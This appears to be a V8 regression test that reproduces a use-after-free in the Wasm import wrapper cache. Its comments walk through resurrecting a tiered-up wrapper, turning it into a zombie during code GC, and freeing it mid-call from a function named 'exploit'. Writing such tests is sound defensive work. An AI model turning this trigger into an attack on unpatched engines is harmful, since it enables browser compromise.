// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --wasm-wrapper-tiering-budget=1 --expose-gc --allow-natives-syntax

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');
let builder = new WasmModuleBuilder();
let $sig0 = builder.addType(kSig_v_i);
let $sig1 = builder.addType(kSig_v_v);

let cb_index = builder.addImport('js', 'cb', $sig0);
builder.addExport('wasm_cb', cb_index);

let $table0 = builder.addImportedTable('js', 'table', 1);

builder.addFunction("warmup_cb", $sig1).exportFunc().addBody([
  kExprI32Const, 1,
  kExprI32Const, 0,
  kExprCallIndirect, $sig0, $table0,
]);
builder.addFunction("exploit", $sig1).exportFunc().addBody([
  kExprI32Const, 0,
  kExprI32Const, 0,
  kExprCallIndirect, $sig0, $table0,
]);

let table = new WebAssembly.Table({ initial: 1, element: "anyfunc" });

function cb(warmup) {
  if (warmup) return;
  // Drop the refcount of the resurrected wrapper to zero.
  // Since it is in the dead_code_ set, this will immediately free it, even
  // though the wrapper is still being used!
  table.set(0, null);
  gc();  // Used to trip DCHECKs.
}

let wasm_inst = builder.instantiate({ js: { table, cb } });
let { wasm_cb, warmup_cb, exploit } = wasm_inst.exports;

// Tier up the import wrapper.
table.set(0, wasm_cb);
for (let i = 0; i < 2; i++) warmup_cb();

// Replace the dispatch table reference with a generic wrapper reference.
// This drops the refcount of the tiered up import wrapper to 0, adding it to
// potentially_dead_code_ while leaving it in the import wrapper cache.
table.set(0, null);

// Resurrect the wrapper from the import cache, incrementing its refcount again.
// Do this by triggering another tierup; Runtime_TierUpWasmToJSWrapper won't
// compile a new tiered-up wrapper since the old one is still in the cache.
table.set(0, wasm_cb);
for (let i = 0; i < 2; i++) warmup_cb();

// Run a Wasm code GC.
// This will try to free the resurrected wrapper, but it will bail out early
// since the refcount has been increased since then.
// However, it still adds the wrapper to dead_code_, turning it into a
// zombie WasmCode object.
// Construct a giant function so that replacing the Liftoff code triggers
// a Wasm code GC.
let builder2 = new WasmModuleBuilder();
let func_body = [];
for (let i = 0; i < 30_000; i++) {
  func_body.push(
      kExprLocalGet, 0, kExprLocalGet, 0, kExprF64Add, kExprLocalSet, 0);
}
func_body.push(kExprLocalGet, 0);
builder2.addFunction("func", kSig_d_v).exportFunc().addLocals(kWasmF64, 1)
    .addBody(func_body);

let gc_inst = builder2.instantiate();
let gc_func = gc_inst.exports.func;
gc_func();
%WasmTierUpFunction(gc_func);
gc_func();

exploit();
